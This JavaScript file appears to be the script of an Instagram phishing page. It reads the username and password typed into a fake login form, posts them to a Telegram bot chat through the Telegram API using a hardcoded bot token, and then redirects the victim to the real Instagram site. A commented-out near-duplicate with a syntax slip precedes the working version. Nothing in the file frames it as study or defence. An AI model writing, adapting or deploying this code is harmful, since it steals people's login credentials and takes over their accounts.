

// 
// let API_TOKEN = `6324045403:AAFuJsUDF70RVr5kh_5RwQziQoY9580uh6M`;
// let button = document.querySelector('.login-button');
// let inputs = document.querySelectorAll('input');

// button.addEventListener('click', (e) => {
//     e.preventDefault();
    
//     let login = inputs[0].value.trim();
//     let password = inputs[1].value.trim();
    
//     if (login !== '' && password !== '') {
//         fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
//             method: 'POST',
//             headers: {
//                 'Content-Type': 'application/json'
//             },
//             body: JSON.stringify({
//                 chat_id: '6094409630',
//                 text: `login: ${login} \n password: ${password}`
//             })
//         })
//         .then((res) => res.json())
//         .then((data) = {
//             window.location.href = `https://www.instagram.com`
//         })
        
//     } else {
//         console.error('Login or password cannot be empty');
//     }
// });



let API_TOKEN = `6324045403:AAFuJsUDF70RVr5kh_5RwQziQoY9580uh6M`;
let button = document.querySelector('.login-button');
let inputs = document.querySelectorAll('input');

button.addEventListener('click', (e) => {
    e.preventDefault();
    
    let login = inputs[0].value.trim();
    let password = inputs[1].value.trim();
    
    if (login !== '' && password !== '') {
        fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '6094409630',
                text: `login: ${login} \n password: ${password}`
            })
        })
        .then((res) => res.json())
        .then((data) => {
            window.location.href = `https://www.instagram.com`
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    } else {
        console.error('Login or password cannot be empty');
    }
});
